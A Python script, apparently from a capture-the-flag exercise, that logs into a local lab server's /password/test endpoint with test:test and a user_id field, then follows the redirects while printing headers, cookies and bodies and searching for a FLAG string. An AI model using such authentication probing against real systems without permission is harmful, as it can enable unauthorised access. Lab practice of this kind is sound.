import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"

print("[*] Analyzing complete authentication flow with session tracking\n")

# Create session and track all requests
session = requests.Session()

# Enable detailed logging
import logging
logging.basicConfig(level=logging.DEBUG)

print("[STEP 1] POST to /password/test with test:test")
auth_data = {
    'username': 'test',
    'password': 'test',
    'user_id': '10032'
}

# Don't follow redirects initially
auth_resp = session.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)
print(f"\n[Response 1]")
print(f"Status: {auth_resp.status_code}")
print(f"Headers: {dict(auth_resp.headers)}")
print(f"Cookies after auth: {dict(session.cookies)}")
print(f"Body length: {len(auth_resp.text)}B")
print(f"Body: {auth_resp.text}")

# Check for FLAG in immediate response
flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
if flag_match:
    print(f"\n[!] FLAG FOUND in auth response: {flag_match.group(0)}")

print("\n" + "="*60 + "\n")

# If 302, follow the redirect manually
if auth_resp.status_code == 302:
    redirect_url = auth_resp.headers.get('Location', '')
    print(f"[STEP 2] Following redirect to: {redirect_url}")
    
    if redirect_url.startswith('/'):
        redirect_url = BASE_URL + redirect_url
    
    redirect_resp = session.get(redirect_url, allow_redirects=False)
    print(f"\n[Response 2]")
    print(f"Status: {redirect_resp.status_code}")
    print(f"Headers: {dict(redirect_resp.headers)}")
    print(f"Cookies: {dict(session.cookies)}")
    print(f"Body length: {len(redirect_resp.text)}B")
    print(f"Body: {redirect_resp.text}")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', redirect_resp.text)
    if flag_match:
        print(f"\n[!] FLAG FOUND in redirect response: {flag_match.group(0)}")
    
    # If another redirect, follow it
    if redirect_resp.status_code == 302:
        redirect_url2 = redirect_resp.headers.get('Location', '')
        print(f"\n[STEP 3] Following second redirect to: {redirect_url2}")
        
        if redirect_url2.startswith('/'):
            redirect_url2 = BASE_URL + redirect_url2
        
        final_resp = session.get(redirect_url2, allow_redirects=True)
        print(f"\n[Response 3]")
        print(f"Status: {final_resp.status_code}")
        print(f"URL: {final_resp.url}")
        print(f"Body length: {len(final_resp.text)}B")
        print(f"Body: {final_resp.text}")
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', final_resp.text)
        if flag_match:
            print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")

print("\n[*] Flow analysis complete")

